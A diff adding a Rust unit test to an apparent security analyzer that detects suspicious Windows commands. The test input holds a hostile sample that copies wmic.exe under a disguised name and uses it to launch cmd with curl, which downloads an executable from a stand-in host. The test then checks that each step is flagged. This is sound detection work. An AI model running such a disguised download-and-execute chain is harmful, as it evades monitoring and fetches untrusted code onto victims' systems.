@@ -18005,6 +18005,49 @@ mod wmic_tests {
     }
 
     #[test]
+    fn copied_wmic_alias_process_call_create_child_is_analyzed() {
+        let report = analyze(
+            br#"copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\wm.tmp
+C:\Users\Public\wm.tmp process call create "cmd /c curl -o out.exe https://copied-wmic.example/p.exe""#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\wm.tmp"#
+                )
+            }),
+            "copied wmic alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::WmicProcessCreate { inner_cmd }
+                        if inner_cmd == "cmd /c curl -o out.exe https://copied-wmic.example/p.exe"
+                )
+            }),
+            "copied wmic alias did not emit WmicProcessCreate: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-wmic.example/p.exe"
+                            && dst.as_deref() == Some("out.exe")
+                )
+            }),
+            "copied wmic child download not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn wmic_node_process_call_create_extracts_inner() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
